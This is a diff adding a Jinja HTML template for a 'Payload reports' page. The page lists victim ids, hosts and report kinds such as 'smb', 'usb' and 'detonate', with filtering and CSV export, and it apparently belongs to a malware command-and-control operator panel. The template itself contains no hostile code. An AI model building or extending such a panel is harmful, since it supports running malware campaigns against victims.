@@ -1,0 +1,20 @@
+{% extends "base.html" %}
+{% block title %}reports{% endblock %}
+{% block content %}
+<h1>Payload reports</h1>
+<p class="sub">{{ rows|length }} rows</p>
+<form method="get" class="filter panel">
+  <div><label>kind</label><input name="kind" value="{{ kind }}" placeholder="smb, usb, detonate…"></div>
+  <div><label>vid</label><input name="vid" value="{{ vid }}" placeholder="victim id fragment"></div>
+  <div><button class="btn" type="submit">FILTER</button></div>
+  <div><a class="btn dim" href="{{ url_for('reports') }}">RESET</a></div>
+  <div><a class="btn dim" href="{{ url_for('export_reports') }}">EXPORT CSV</a></div>
+</form>
+<table>
+<tr><th>time</th><th>vid</th><th>kind</th><th>host</th><th>detail</th></tr>
+{% for r in rows %}
+<tr><td class="sub small">{{ r['ts'] }}</td><td class="small">{{ r['vid'][:16] }}…</td>
+    <td>{{ r['kind'] }}</td><td>{{ r['host'] or '?' }}</td><td>{{ r['detail'] }}</td></tr>
+{% else %}<tr><td colspan="5" class="sub">no reports</td></tr>{% endfor %}
+</table>
+{% endblock %}
